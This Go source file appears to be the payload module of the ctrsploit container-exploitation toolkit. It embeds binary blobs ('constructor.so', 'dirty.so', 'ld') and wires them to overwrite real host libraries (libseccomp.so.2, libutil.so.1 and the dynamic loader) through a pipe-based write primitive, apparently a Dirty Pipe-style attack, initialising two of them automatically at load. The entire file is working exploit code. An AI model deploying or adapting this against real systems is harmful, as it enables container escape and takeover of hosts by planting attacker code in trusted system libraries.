package payload

import (
	_ "embed"
	pipe_primitive "github.com/ctrsploit/ctrsploit/helper/pipe-primitive"
	"github.com/ssst0n3/awesome_libs/awesome_error"
)

//go:embed constructor.so
var constructor []byte

//go:embed dirty.so
var dirty []byte

//go:embed ld
var ld []byte

var (
	Constructor = pipe_primitive.Library{
		Name:    "libseccomp.so.2",
		Path:    "/lib/x86_64-linux-gnu/libseccomp.so.2",
		Payload: constructor,
	}
	Dirty = pipe_primitive.Library{
		Name:    "libutil.so.1",
		Path:    "/lib/x86_64-linux-gnu/libutil.so.1",
		Payload: dirty,
	}
	Ld = pipe_primitive.Library{
		Name:    "/lib64/ld-linux-x86-64.so.2",
		Path:    "/lib64/ld-linux-x86-64.so.2",
		Payload: ld,
	}
)

func init() {
	awesome_error.CheckFatal(Constructor.Init())
	awesome_error.CheckFatal(Dirty.Init())
}
